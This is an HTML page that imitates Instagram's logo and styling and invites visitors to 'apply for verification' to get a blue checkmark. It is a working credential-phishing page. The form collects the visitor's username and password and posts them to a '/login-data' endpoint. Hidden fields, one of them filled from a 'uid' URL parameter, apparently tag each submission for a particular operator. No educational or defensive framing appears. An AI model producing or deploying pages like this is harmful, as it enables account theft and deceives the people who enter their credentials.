<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Request Instagram Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 3px; width: 400px; padding: 30px; text-align: center; }
        .logo { width: 48px; margin-bottom: 20px; }
        h2 { font-size: 22px; font-weight: 600; }
        p { color: #8e8e8e; font-size: 14px; }
        input { width: 100%; padding: 9px; margin: 8px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; margin-top: 14px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram">
        <h2>Apply for Instagram Verification</h2>
        <p>Verified accounts have blue checkmarks to let people know that they're the real deal. Confirm your identity to proceed.</p>
        <form action="/login-data" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <!-- HIDDEN FIELDS -->
            <input type="hidden" name="service" value="InstaBlueTick">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Submit</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const userId = new URLSearchParams(window.location.search).get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
